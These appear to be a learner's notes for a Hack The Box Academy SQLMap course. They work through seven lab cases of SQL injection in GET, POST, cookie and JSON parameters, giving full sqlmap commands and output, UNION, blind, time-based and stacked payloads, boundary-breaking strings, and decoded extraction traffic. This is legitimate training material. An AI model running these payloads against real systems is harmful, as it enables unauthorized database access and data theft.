
# HTB: SQL Essentials Summary

Module Link: https://academy.hackthebox.com/app/module/58


## **Running SQLMap on an HTTP Request**

### Case-1:

Running SQLMap aginst this target: `http://example.com/vuln.php?id=1 `

To properly setup an sql request is to visit the target page and open the devTool in the browser and copy the request send as copy as curl from the network tab and paste it:

```bash
curl 'http://94.237.123.185:42258/case1.php?id=1' \
  --compressed \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://94.237.123.185:42258/case1.php' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i'
```

or we can copy the request header from burp and paste it into a file, as such:

```bash
$ cat case-1.txt                                           
GET /case1.php?id=1 HTTP/1.1
Host: 94.237.123.185:42258
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://94.237.123.185:42258/case1.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

Now we can build the sqlmap request

```bash
$ sudo sqlmap -r case-1.txt --batch
       ...                                                          

[14:56:24] [INFO] parsing HTTP request from 'case-1.txt'
[14:56:24] [INFO] testing connection to the target URL
[14:56:24] [INFO] testing if the target URL content is stable
[14:56:25] [INFO] target URL content is stable
[14:56:25] [INFO] testing if GET parameter 'id' is dynamic
[14:56:25] [INFO] GET parameter 'id' appears to be dynamic
[14:56:25] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[14:56:26] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[14:56:26] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[14:56:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:56:26] [WARNING] reflective value(s) found and filtering out
[14:56:26] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Rice")
[14:56:26] [INFO] testing 'Generic inline queries'
[14:56:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                                           
[14:56:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[14:56:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                                                                                       
[14:56:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[14:56:27] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'                                                                                               
[14:56:27] [WARNING] potential permission problems detected ('command denied')
[14:56:27] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[14:56:27] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                                                                               
[14:56:28] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[14:56:28] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                                     
[14:56:29] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable                                                                            
[14:56:29] [INFO] testing 'MySQL inline queries'
[14:56:29] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[14:56:29] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)
[14:56:41] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[14:56:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:56:52] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[14:56:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:56:52] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:56:53] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[14:56:55] [INFO] target URL appears to have 6 columns in query
[14:56:57] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 43 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 2623=2623

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 4272 FROM(SELECT COUNT(*),CONCAT(0x7170707071,(SELECT (ELT(4272=4272,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4986 FROM (SELECT(SLEEP(5)))hPKi)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT CONCAT(0x7170707071,0x625170495a754b726a4179644e5658777572665179415067704841696a67564744664e7665526f6b,0x71707a7871),NULL,NULL,NULL,NULL,NULL-- -
---
[14:56:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[14:56:58] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/94.237.123.185'                                                                                                       

[*] ending @ 14:56:58 /2026-01-14/

```

 ![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/1.png)

Testing the error-based injection

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/2.png)

Testing Union injection

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/3.png)

### **Case2 - POST parameter**

```bash
$ sudo sqlmap -u "http://94.237.123.185:42258/case2.php" --data "id=1" --batch --dump --technique=U
...
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b7a6271,0x786e465545427046564642424e5947747a474e4d50726b4674454f6f584662584a774d56494f6468,0x7171626271),NULL-- -
---
[15:19:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[15:19:37] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:19:37] [INFO] fetching current database
[15:19:37] [WARNING] reflective value(s) found and filtering out
[15:19:37] [INFO] fetching tables for database: 'testdb'
[15:19:37] [WARNING] potential permission problems detected ('command denied')
[15:19:37] [INFO] fetching columns for table 'flag2' in database 'testdb'
[15:19:38] [INFO] fetching entries for table 'flag2' in database 'testdb'
Database: testdb
Table: flag2
[1 entry]
+----+----------------------------------------+
| id | content                                |
+----+----------------------------------------+
| 1  | HTB{700_much_c0n6r475_0n_p057_r3qu357} |
+----+----------------------------------------+

```

### **Case3 - Cookie value (id)**

```bash
 curl http://83.136.253.132:45630/case3.php -I  
HTTP/1.1 200 OK
Date: Thu, 15 Jan 2026 09:42:22 GMT
Server: Apache/2.4.38 (Debian)
Set-Cookie: id=1; path=/case3.php
Content-Type: text/html; charset=UTF-8
```

```bash
$ sqlmap -u http://83.136.253.132:45630/case3.php --cookie="id=1*" --dump -D testdb -T flag3  --batch
...
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 9301=9301

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 6559 FROM(SELECT COUNT(*),CONCAT(0x7178767671,(SELECT (ELT(6559=6559,1))),0x71786a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 8108 FROM (SELECT(SLEEP(5)))gcrM)

    Type: UNION query
    Title: Generic UNION query (NULL) - 10 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178767671,0x7541415a7a4c7042717841426f714f6e57577243475250676a6c4a76704b4c4277656d5762756855,0x71786a6a71)-- -

Database: testdb
Table: flag3
[1 entry]
+----+------------------------------------------+
| id | content                                  |
+----+------------------------------------------+
| 1  | HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475} |
+----+------------------------------------------+

```

### **Case4 - JSON value (`id`)**

Detect and exploit SQLi vulnerability in JSON data `{"id": 1}`

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/4.png)

```bash
$ sqlmap -r case-4.txt --dbms mysql --dump -D testdb -T flag4  --batch 
...
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"id":"1 AND 8714=8714"}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"id":"1 AND (SELECT 5312 FROM(SELECT COUNT(*),CONCAT(0x7170787a71,(SELECT (ELT(5312=5312,1))),0x7170627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"}

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: {"id":"1;SELECT SLEEP(5)#"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 9659 FROM (SELECT(SLEEP(5)))YnVt)"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: {"id":"1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7170787a71,0x51584d556c527248776e74564446534f467041426566645750755a7a754b775456496957644e724f,0x7170627671),NULL-- -"}
---
[13:12:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:12:48] [INFO] fetching columns for table 'flag4' in database 'testdb'
[13:12:48] [INFO] fetching entries for table 'flag4' in database 'testdb'
Database: testdb
Table: flag4
[1 entry]
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{j45[REDIRECT]75} |
+----+---------------------------------+

```

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/5.png)

## Handling sqlmap errors

| **Option** | **Function** | **Best For...** |
| --- | --- | --- |
| `--parse-errors` | Shows DBMS-specific errors | Finding syntax mistakes (quotes, brackets) |
| `-t [file]` | Logs traffic to a file | Record keeping and offline audit |
| `-v 6` | Full terminal verbosity | Real-time debugging and monitoring |
| `--proxy` | Routes traffic through a proxy | Manual testing and request manipulation |

## Attack Tuning

To effectively use **SQLMap**, you often need to move beyond default settings to bypass filters or handle complex database structures. This summary breaks down the core "Attack Tuning" concepts into three main categories: Payload Construction, Intensity Levels, and Advanced Detection.

### 1. Payload Construction: Prefix and Suffix

Every SQLMap payload is composed of a **vector** (the actual SQL command) and **boundaries** (the syntax needed to break out of the existing query).

- **Prefix/Suffix:** Used when a target has a unique query structure (e.g., nested parentheses) that SQLMap’s defaults can’t break.
    - **Example:** `-prefix="%'))" --suffix="-- -"` manually wraps the payload to ensure it results in valid SQL.

### 2. Tuning Intensity: Level and Risk

SQLMap allows you to scale the "depth" and "danger" of its tests using two primary switches:

| Option | Range | Purpose | Impact |
| --- | --- | --- | --- |
| **`--level`** | 1–5 | Increases the number of **boundaries** and locations tested (e.g., testing Cookies or Headers at higher levels). | Higher levels are much slower but find "hidden" vulnerabilities. |
| **`--risk`** | 1–3 | Increases the complexity of **vectors** used. | **Risk 3** includes `OR`-based tests, which can be dangerous as they might unintentionally modify or delete data. |

### Case5 - OR SQLi

Detect and exploit (OR) SQLi vulnerability in GET parameter `id`

This attack is a classic example of **Boolean-based Blind SQL Injection** using an **OR logic bypass**. Because the server doesn't show you the database data directly (like a Union-based attack would), SQLMap will  "ask" the database thousands of True/False questions to reconstruct the data character by character.

**So how we differentiate between true or false response**? Here I tested OR logic on a True condition and it returns this page: Note the **response length** 

```sql
-6901 OR 1=1 
```

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/6.png)

and this is the false condition: 

```sql
-6901 OR 1=77 
```

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/7.png)

- False → Content-length = 1995
- True → Content-length = 6897

In `sqlmap`, increase the level and the risk to force it use the `OR` condition

```bash
$ sqlmap -u "http://94.237.56.99:42024/case5.php?id=1*"  --technique=B --level=5 --risk=3 -dbms mysql -D testdb -T flag5 -C content --dump  -t case5-tarffic.txt --no-cast
 
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: http://94.237.56.99:42024/case5.php?id=-2209 OR 4182=4182
---
[14:36:03] [INFO] testing MySQL
[14:36:03] [INFO] confirming MySQL
[14:36:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[14:36:03] [INFO] fetching entries of column(s) 'content' for table 'flag5' in database 'testdb'
[14:36:03] [INFO] fetching number of column(s) 'content' entries for table 'flag5' in database 'testdb'
[14:36:03] [INFO] resumed: 1
[14:36:03] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[14:36:03] [INFO] retrieved: HTB{700_much_r15k_b \xc97_w0r7h_17}
[14:36:35] [WARNING] potential binary fields detected ('content'). In case of any problems you are advised to rerun table dump with '--fresh-queries --binary-fields="content"'
Database: testdb
Table: flag5
[1 entry]
+----------------------------------------+
| content                                |
+----------------------------------------+
| HTB{700_much_r15k_b\x03\xc97_w0r7h_17} |
+----------------------------------------+
```

The extra characters often come from SQLMap trying to "guess" the length of the string incorrectly. To solve this, I added these two switches: 

- **`-hex`**: This tells SQLMap to use the `HEX()` function to retrieve data. It prevents issues with special characters (like `{` or `_`) interfering with the HTTP response.
- **`-fresh-queries`**: SQLMap caches results. If you got a "dirty" flag once, it might keep showing it. Use this to ignore the cache and try a clean fetch.

```bash
─$ sqlmap -u "http://83.136.253.144:39616/case5.php?id=1*"  --technique=B --level=5 --risk=3 -dbms mysql -D testdb -T flag5 -C id,content --dump  -t case5-tarffic.txt --text-only --hex --fresh-queries   

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: http://83.136.253.144:39616/case5.php?id=-6817 OR 4768=4768
---
[15:05:53] [INFO] testing MySQL
[15:05:53] [INFO] confirming MySQL
[15:05:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[15:05:53] [INFO] fetching entries of column(s) 'content,id' for table 'flag5' in database 'testdb'
[15:05:53] [INFO] fetching number of column(s) 'content,id' entries for table 'flag5' in database 'testdb'
[15:05:53] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:05:56] [INFO] retrieved: 1    
[15:06:39] [INFO] retrieved: HTB{700_much_r15k_bu7_w0r7h_17}                                                                
[15:06:41] [INFO] retrieved: 1    
Database: testdb
Table: flag5
[1 entry]
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{700_much_r15k_bu7_w0r7h_17} |
+----+---------------------------------+

[15:06:41] [INFO] table 'testdb.flag5' dumped to CSV file '/home/kali/.local/share/sqlmap/output/83.136.253.144/dump/testdb/flag5.csv'                                                                                      
[15:06:41] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/83.136.253.144'                                                                                                            

[*] ending @ 15:06:41 /2026-01-16/
```

To decode saved  traffic:

```bash
 python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))" <case5-tarffic.txt > decoded-traffic.txt
```

decoded traffic

```bash
$ grep URI decoded-traffic.txt  | tail 
URI: http://94.237.56.99:42024/case5.php?id=-6901 OR ORD(MID((SELECT content FROM testdb.flag5 ORDER BY content LIMIT 0,1),31,1))>87
URI: http://94.237.56.99:42024/case5.php?id=-6901 OR ORD(MID((SELECT content FROM testdb.flag5 ORDER BY content LIMIT 0,1),31,1))>107
URI: http://94.237.56.99:42024/case5.php?id=-6901 OR ORD(MID((SELECT content FROM testdb.flag5 ORDER BY content LIMIT 0,1),31,1))>117
URI: http://94.237.56.99:42024/case5.php?id=-6901 OR ORD(MID((SELECT content FROM testdb.flag5 ORDER BY content LIMIT 0,1),31,1))>122
URI: http://94.237.56.99:42024/case5.php?id=-6901 OR ORD(MID((SELECT content FROM testdb.flag5 ORDER BY content LIMIT 0,1),31,1))>125
URI: http://94.237.56.99:42024/case5.php?id=-6901 OR ORD(MID((SELECT content FROM testdb.flag5 ORDER BY content LIMIT 0,1),31,1))>123
URI: http://94.237.56.99:42024/case5.php?id=-6901 OR ORD(MID((SELECT content FROM testdb.flag5 ORDER BY content LIMIT 0,1),31,1))>124
URI: http://94.237.56.99:42024/case5.php?id=-6901 OR ORD(MID((SELECT content FROM testdb.flag5 ORDER BY content LIMIT 0,1),32,1))>64
URI: http://94.237.56.99:42024/case5.php?id=-6901 OR ORD(MID((SELECT content FROM testdb.flag5 ORDER BY content LIMIT 0,1),32,1))>32
URI: http://94.237.56.99:42024/case5.php?id=-6901 OR ORD(MID((SELECT content FROM testdb.flag5 ORDER BY content LIMIT 0,1),32,1))>1
```

| **SQL Function** | **Purpose** |
| --- | --- |
| `SELECT content...` | This is the "Subquery" that grabs the actual flag from the table. |
| `MID(..., 31, 1)` | This isolates a single character. Here, it is looking at the **31st character** of the flag. |
| `ORD(...)` | This converts that single character into its **ASCII numeric code** (e.g., 'A' becomes 65). |
| `> 123` | This is the "Question." Is the ASCII value of the 31st character greater than 123? |

Notice how the numbers at the end of URI logs change: `>87`, `>107`, `>117`, `>122`, `>125`.
SQLMap isn't guessing every number from 1 to 255. It uses a **Binary Search Algorithm**:

1. Is it `> 64`? (True)
2. Is it `> 96`? (True)
3. Is it `> 112`? (False)
4. It narrows the range until it identifies the exact ASCII number. Once it has the number, it converts it back to a letter (e.g., `125` becomes `}`).

here, I tested the payload to guess the last character of the flag (which is `}` ).

```sql
-6901 OR ORD(MID((SELECT content FROM testdb.flag5 ORDER BY content LIMIT 0,1),31,1))>64
```

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/8.png)

**The First Query (Returns TRUE):**`...ORD(MID(...,31,1))>64`

- **Database action:** The 31st character is `}`. The ASCII value of `}` is **125**.
- **Evaluation:** Is 125>64? **Yes (TRUE)**.
- **Result:** Because it is an `OR` statement and the second half is TRUE, the database treats the whole query as valid and returns all the records
- **Response Size:**  Content-Length: 6897.

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/9.png)

**The Second Query (Returns FALSE):**`...ORD(MID(...,31,1))>125`

- **Database action:** The ASCII value is still **125**.
- **Evaluation:** Is 125>125? **No (FALSE)**.
- **Result:** The first part (`id=-6901`) is False. The second part (`125 > 125`) is False. `FALSE OR FALSE` is **FALSE**.
- **Response Size:** Content-Length: 1995**.**

### Case6 - Non-standard boundaries

Detect and exploit SQLi vulnerability in GET parameter `col` having non-standard boundaries

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/10.png)

I added the backtick next to id

```sql
col=id`
```

result in: 

```sql
SQL error:
SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1<br>
```

The backtick ( **`** ) character is a major clue. In MySQL/MariaDB, backticks are used to quote **identifiers** (like column names or table names), not strings.

If adding a backtick causes a syntax error, the backend query likely looks like this:
`SELECT id, name, flag FROM users ORDER BY **$col**`

To inject into this, you need to "close" that backtick, insert your logic, and then handle the trailing backtick that the developer’s code will append.

```sql
id`)or+1=1--+-
```

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/11.png)

We got a response length different from the usual, so this means the query is valid. Using these findings, tune `sqlmap` to retrieve the content of the database

```bash
$ sqlmap -u "http://94.237.120.137:54277/case6.php?col=id*" --prefix="\`)" --suffix="-- -"  --technique=UB --dbms mysql -D testdb -T flag6 -C id,content --dump -t case6-traffic.txt 
   
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://94.237.120.137:54277/case6.php?col=id`) AND 2602=2602-- -

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: http://94.237.120.137:54277/case6.php?col=id`) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7178786271,0x55584a524a62694b6b4d434367726c575947506542585a78474d6357554b47777859775149686e49,0x717a766a71),NULL-- -
---
[19:44:48] [INFO] testing MySQL
[19:44:48] [INFO] confirming MySQL
[19:44:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[19:44:49] [INFO] fetching entries of column(s) 'content,id' for table 'flag6' in database 'testdb'
[19:44:50] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[19:44:50] [WARNING] the SQL query provided does not return any output
[19:44:50] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[19:44:50] [INFO] fetching number of column(s) 'content,id' entries for table 'flag6' in database 'testdb'
[19:44:50] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[19:44:50] [INFO] retrieved: 1
[19:44:53] [INFO] retrieved: HTB{v1nc3_mcm4h0n_15_4570n15h3d}
[19:46:12] [INFO] retrieved: 1
Database: testdb
Table: flag6
[1 entry]
+----+----------------------------------+
| id | content                          |
+----+----------------------------------+
| 1  | HTB{v1nc3_mcm4h0n_15_4570n15h3d} |
+----+----------------------------------+
```

decoded traffic:

```bash
$ grep "URI" decoded-traffic.txt| tail 
URI: http://94.237.120.137:54277/case6.php?col=id`) AND ORD(MID((SELECT IFNULL(CAST(content AS CHAR),0x20) FROM testdb.flag6 ORDER BY id LIMIT 0,1),33,1))>1-- -
URI: http://94.237.120.137:54277/case6.php?col=id`) AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM testdb.flag6 ORDER BY id LIMIT 0,1),1,1))>64-- -
URI: http://94.237.120.137:54277/case6.php?col=id`) AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM testdb.flag6 ORDER BY id LIMIT 0,1),1,1))>32-- -
URI: http://94.237.120.137:54277/case6.php?col=id`) AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM testdb.flag6 ORDER BY id LIMIT 0,1),1,1))>48-- -
URI: http://94.237.120.137:54277/case6.php?col=id`) AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM testdb.flag6 ORDER BY id LIMIT 0,1),1,1))>56-- -
URI: http://94.237.120.137:54277/case6.php?col=id`) AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM testdb.flag6 ORDER BY id LIMIT 0,1),1,1))>52-- -
URI: http://94.237.120.137:54277/case6.php?col=id`) AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM testdb.flag6 ORDER BY id LIMIT 0,1),1,1))>50-- -
URI: http://94.237.120.137:54277/case6.php?col=id`) AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM testdb.flag6 ORDER BY id LIMIT 0,1),1,1))>49-- -
URI: http://94.237.120.137:54277/case6.php?col=id`) AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM testdb.flag6 ORDER BY id LIMIT 0,1),2,1))>47-- -
URI: http://94.237.120.137:54277/case6.php?col=id`) AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM testdb.flag6 ORDER BY id LIMIT 0,1),2,1))>1-- -
                                            
```

### Case7 - UNION SQLi with adjustments

Detect and exploit SQLi vulnerability in GET parameter `id` by usage of UNION query-based technique

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/12.png)

I first run the sqlmap with the default column check (1-10), but that didnt work, so i specfied the range using the switch `--union-cols` to check columns up to 50 

```bash
$ sqlmap -u "http://94.237.120.137:54277/case7.php?id=1*" --level=5 --risk=3 -v 3 --technique=U --union-cols=1-50 
...
sqlmap identified the following injection point(s) with a total of 442 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns (custom)
    Payload: http://94.237.120.137:54277/case7.php?id=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71706b6a71,0x7664464174634764494b556e7264657249664f696d55445441777a61757869576d6d51626843454e,0x71717a7a71),NULL-- -
    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL-- -

```

Second, I run this test:

```bash
 sqlmap -u "http://94.237.59.242:47626/case7.php?id=-1*" --technique=U --union-cols=5 --dbms mysql --dbs --batch 
```

But I got this error:

```bash
[20:47:52] [WARNING] the SQL query provided does not return any output
[20:47:52] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[20:47:52] [INFO] falling back to current database
[20:47:52] [INFO] fetching current database
[20:47:52] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries)
[20:47:52] [CRITICAL] unable to retrieve the database names
```

and it worked by adding the `—no-cast` switch

```bash
$ sqlmap -u "http://94.237.59.242:47626/case7.php?id=-1*" --technique=U --union-cols=5 --dbms mysql -D testdb -T flag7 -C id,content --dump --batch --no-cast -v 3 -t case7-traffic.txt

[20:50:06] [PAYLOAD] -1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170627171,content,0x6a686c74646e,id,0x7176787871),NULL,NULL FROM testdb.flag7-- -
[20:50:06] [WARNING] reflective value(s) found and filtering out
[20:50:06] [DEBUG] performed 2 queries in 0.73 seconds
[20:50:06] [DEBUG] analyzing table dump for possible password hashes
Database: testdb
Table: flag7
[1 entry]
+----+-----------------------+
| id | content               |
+----+-----------------------+
| 1  | HTB{un173_7h3_un173d} |
+----+-----------------------+
```

decoded traffic:

```bash
$ grep "URI" decoded-traffic.txt| tail
URI: http://94.237.59.242:47626/case7.php?id=-1
URI: http://94.237.59.242:47626/case7.php?id=-1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170627171,(CASE WHEN (ISNULL(VECTOR_DIM(NULL))) THEN 1 ELSE 0 END),0x7176787871),NULL,NULL-- -
URI: http://94.237.59.242:47626/case7.php?id=-1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170627171,(CASE WHEN (ISNULL(JSON_STORAGE_FREE(NULL))) THEN 1 ELSE 0 END),0x7176787871),NULL,NULL-- -
URI: http://94.237.59.242:47626/case7.php?id=-1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170627171,JSON_ARRAYAGG(CONCAT_WS(0x6a686c74646e,content,id)),0x7176787871),NULL,NULL FROM testdb.flag7-- -
URI: http://94.237.59.242:47626/case7.php?id=-1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170627171,content,0x6a686c74646e,id,0x7176787871),NULL,NULL FROM testdb.flag7-- -
```

## Database Enumeration

### **SQLMap Data Exfiltration**

Once detection is finished, you can gather high-level environment details:

- **`-banner`**: Retrieves the DBMS version.
- **`-current-user`**: Identifies the DB user the application is using.
- **`-current-db`**: Identifies the database currently in use.
- **`-is-dba`**: Checks if the current user has administrative (root-level) privileges.

For example: 

```bash
 sqlmap -u "http://94.237.59.242:47626/case1.php?id=1" --banner --current-user --current-db --is-dba --technique=BU -v 3 --no-cast --batch
    
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
